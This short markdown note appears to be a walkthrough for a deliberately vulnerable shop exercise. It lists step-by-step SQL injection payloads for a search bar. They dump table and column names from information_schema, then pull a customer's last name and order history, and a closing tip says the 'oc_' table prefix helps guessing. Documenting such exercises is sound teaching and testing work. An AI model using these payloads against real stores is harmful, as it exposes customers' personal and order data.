# SQL Injection

Simples sql injection is possible by putting `'OR 1=1) -- '` in the search bar

### Thought process

Could be good to allow user to look into the query syntax somehow on error (return sql errors straight to the fronted?)

Next step is getting info about tables:
`') UNION ALL SELECT 0,1,2,3,4,5,6,7,8,9 FROM information_schema.tables -- .`

INFORMATION_SCHEMA.TABLES have columns:

> TABLE_NAME, ENGINE, VERSION, ROW_FORMAT, TABLE_ROWS, AVG_ROW_LENGTH,
> DATA_LENGTH, MAX_DATA_LENGTH, INDEX_LENGTH, DATA_FREE, AUTO_INCREMENT,
> CREATE_TIME, UPDATE_TIME, CHECK_TIME, TABLE_COLLATION, CHECKSUM,
> CREATE_OPTIONS, TABLE_COMMENT

Useful is probably this one:

> TABLE_NAME

`asdf') UNION ALL SELECT 0,1,table_name,3,4,5,6,7,8,9 FROM information_schema.tables -- .`

Get columns:

`asdf') UNION ALL SELECT 0,1,COLUMN_NAME,3,4,5,6,7,8,9 FROM information_schema.columns where table_name = 'customer' -- .`

Get user lastname:

`asdf') UNION ALL SELECT 0,1,lastname,3,4,5,6,7,8,9 FROM customer WHERE customer_id=420 -- .`

Get order table columns:

`asdf') UNION ALL SELECT 0,1,COLUMN_NAME,3,4,5,6,7,8,9 FROM information_schema.columns where table_name = 'order' -- .`

Get order id by customer id (with dates):

`asdf') UNION ALL SELECT 0,1,order_id,date_added,4,5,6,7,8,9 FROM order WHERE customer_id=420 -- .`

Possible sorting with

`asdf') UNION ALL SELECT 0,1,order_id,date_added,4,5,6,7,8,9 FROM order WHERE customer_id=420 ORDER BY date_added DESC -- .`

> Note: usage of "oc\_" prefix for tables might simplify the guessing process. E.g. "order" is an SQL keyword and proper "order" table naming requires quote symbols (throwing errors otherwise)
